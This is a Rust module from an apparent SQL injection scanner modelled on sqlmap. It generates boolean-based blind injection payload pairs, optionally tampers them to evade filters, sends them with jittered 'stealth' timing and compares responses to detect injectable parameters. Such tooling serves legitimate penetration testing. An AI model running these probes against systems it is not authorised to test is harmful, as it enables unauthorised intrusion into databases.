//! Boolean-based blind SQL injection technique.

use std::time::Duration;
use tracing::{debug, info};

use crate::sqx::{
    detector::SqliDetector,
    evasion::tamper_chain::TamperChain,
    models::{HttpResponse, SqliTestResult, SqliTechnique},
    similarity::calculate_similarity,
};

impl SqliDetector {
    /// Test for boolean-based blind SQL injection
    pub(crate) async fn test_boolean_blind(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        tamper: Option<&TamperChain>,
    ) -> Option<SqliTestResult> {
        debug!("Testing boolean-based blind SQL injection on parameter: {}", param);

        let is_numeric = original_value.parse::<i64>().is_ok();

        // 1. Built-in fast path (static boundaries)
        let boundaries = crate::sqx::payload_fetcher::BOUNDARIES;
        for boundary in boundaries.iter() {
            if !is_numeric && boundary.close.is_empty() { continue; }

            let true_payload  = format!("{}{} AND 1=1 {}",
                original_value, boundary.close, boundary.balance);
            let false_payload = format!("{}{} AND 1=2 {}",
                original_value, boundary.close, boundary.balance);

            if let Some(result) = self.try_boolean_pair(
                url, param, original_value, baseline, tamper,
                &true_payload, &false_payload, boundary.label, None
            ).await {
                return Some(result);
            }
        }

        // 2. Dynamic sqlmap payloads path
        let dynamic = crate::sqx::payload_fetcher::DynamicPayloads::load();
        
        // Filter boolean blind tests (stype=1)
        let tests: Vec<_> = dynamic.tests.iter().filter(|t| t.stype == 1).collect();
        
        for test in tests {
            // Level/Risk check (could be configurable via SqliConfig later)
            if test.level > 3 { continue; }

            for boundary in &dynamic.boundaries {
                // Check if boundary clause matches test clause
                if !test.clause.is_empty() && !boundary.clause.is_empty() {
                    let mut match_found = false;
                    for tc in &test.clause {
                        if boundary.clause.contains(tc) {
                            match_found = true;
                            break;
                        }
                    }
                    if !match_found { continue; }
                }

                // Check if boundary where matches test where
                if !test.where_clause.is_empty() && !boundary.where_clause.is_empty() {
                     let mut match_found = false;
                     for tw in &test.where_clause {
                         if boundary.where_clause.contains(tw) {
                             match_found = true;
                             break;
                         }
                     }
                     if !match_found { continue; }
                }

                // Prepare payloads based on sqlmap <request> logic
                // [RANDNUM] -> 1234
                // [PRIORITY] -> usually 1=1 or similar
                let base_payload = test.request_payload
                    .replace("[RANDNUM]", "42")
                    .replace("[PRIORITY]", "1=1");
                
                let true_payload = self.apply_sqlmap_boundary(original_value, &base_payload, boundary);
                
                // For boolean blind, we need a FALSE pair.
                // sqlmap XML usually doesn't have an explicit false payload for detection,
                // it expects us to negate the [INFERENCE] or similar.
                // For simplicity, we'll try to replace "1=1" with "1=2" in the final payload
                // or similar common negations.
                let false_payload = true_payload.replace("1=1", "1=2")
                    .replace("=42", "=43")
                    .replace(" IN (42)", " IN (43)");

                if true_payload == false_payload { continue; }

                if let Some(result) = self.try_boolean_pair(
                    url, param, original_value, baseline, tamper,
                    &true_payload, &false_payload, &format!("dyn:{}", boundary.prefix), Some(&test.title)
                ).await {
                    return Some(result);
                }
            }
        }

        None
    }

    fn apply_sqlmap_boundary(&self, original: &str, payload: &str, boundary: &crate::sqx::payload_fetcher::SqlmapBoundary) -> String {
        let prefix = &boundary.prefix;
        let suffix = &boundary.suffix;
        
        // sqlmap <where> logic:
        // 1: Append to value: {val}{prefix}{payload}{suffix}
        // 2: Inline: {prefix}{payload}{suffix} (replacing or ignoring val)
        // 3: Replace value: {prefix}{payload}{suffix}
        
        // Default to append (1)
        format!("{}{}{}{}", original, prefix, payload, suffix)
    }

    /// Test a single TRUE/FALSE payload pair. Returns a finding if gap > 0.02.
    async fn try_boolean_pair(
        &self,
        url: &str,
        param: &str,
        original_value: &str,
        baseline: &HttpResponse,
        tamper: Option<&TamperChain>,
        true_payload: &str,
        false_payload: &str,
        ctx: &str,
        payload_id: Option<&str>,
    ) -> Option<SqliTestResult> {
        let true_eff  = tamper.map(|t| t.apply(true_payload )).unwrap_or_else(|| true_payload .to_string());
        let false_eff = tamper.map(|t| t.apply(false_payload)).unwrap_or_else(|| false_payload.to_string());

        let true_url  = self.build_test_url(url, param, original_value, &true_eff);
        let true_resp = self.send_request(&true_url).await.ok()?;
        tokio::time::sleep(crate::sqx::stealth::jittered_delay(self.config.delay_ms, self.config.stealth.jitter_pct)).await;

        let false_url  = self.build_test_url(url, param, original_value, &false_eff);
        let false_resp = self.send_request(&false_url).await.ok()?;

        let true_sim  = calculate_similarity(&baseline.body, &true_resp.body);
        let false_sim = calculate_similarity(&baseline.body, &false_resp.body);
        let gap = true_sim - false_sim;

        debug!("Boolean blind ctx={} true_sim={:.2} false_sim={:.2} gap={:.2}",
            ctx, true_sim, false_sim, gap);

        if true_sim > 0.9 && gap > 0.02 {
            info!("Boolean-based blind SQL injection found! (context={})", ctx);
            return Some(SqliTestResult {
                parameter: param.to_string(),
                technique: SqliTechnique::BooleanBlind,
                confidence: 0.85,
                payload: true_eff,
                evidence: format!(
                    "ctx={} TRUE sim={:.0}%, FALSE sim={:.0}%",
                    ctx, true_sim * 100.0, false_sim * 100.0
                ),
                dbms_hint: None,
                        injection_context: Some(ctx.to_string()),
                payload_id: payload_id.map(|s| s.to_string()),
            });
        }
        None
    }
}
